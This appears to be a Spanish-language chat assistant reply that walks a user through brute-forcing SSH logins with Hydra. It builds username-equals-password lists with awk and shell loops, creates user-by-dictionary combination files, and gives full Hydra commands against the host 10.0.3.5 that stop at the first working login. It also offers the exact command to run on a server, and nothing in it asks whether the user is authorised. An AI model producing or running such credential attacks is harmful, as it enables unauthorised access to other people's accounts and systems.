## ✅ Correcto. Para usar `-C` necesitás formato `usuario:contraseña`

Si querés probar **usuario = contraseña**, generá el archivo así:

---

## 🔧 Comando para generar `usuario:usuario`

```bash
while read user; do echo "$user:$user"; done < usuarios.txt > usuarios_mismatch.txt
```

O con `awk`:

```bash
awk '{print $1":"$1}' usuarios.txt > usuarios_mismatch.txt
```

---

## 📝 Verificá que quedó bien

```bash
head -5 usuarios_mismatch.txt
```

Debería verse así:
```
root:root
admin:admin
eacosta:eacosta
racosta:racosta
jadrover:jadrover
```

---

## 🚀 Luego usalo con Hydra

```bash
hydra -C usuarios_mismatch.txt ssh://10.0.3.5 -t 6 -w 1 -v -o resultados_mismatch.txt
```

---

## 🔄 Bonus: si querés combinar con diccionario

Si tenés `dic.txt` y querés probar también `usuario:contraseña` donde la contraseña está en el diccionario:

```bash
# Formato 1: usuario:password (cada línea)
while read user; do
    while read pass; do
        echo "$user:$pass"
    done < dic.txt
done < usuarios.txt > combinaciones_usuario_pass.txt
```

Pero **cuidado**: ese archivo puede ser enorme (`usuarios × diccionario`).

---

## 💡 Para tu primera prueba, recomiendo:

```bash
# 1. Generar usuario:usuario
awk '{print $1":"$1}' usuarios.txt > prueba_mismatch.txt

# 2. Probar con Hydra (rápido, pocas combinaciones)
hydra -C prueba_mismatch.txt ssh://10.0.3.5 -t 6 -w 1 -v -f -o resultado_mismatch.txt
```

Si encontrás algún match, el `-f` hace que pare en el primer éxito.

¿Necesitás que te dé el comando exacto para ejecutar en el server?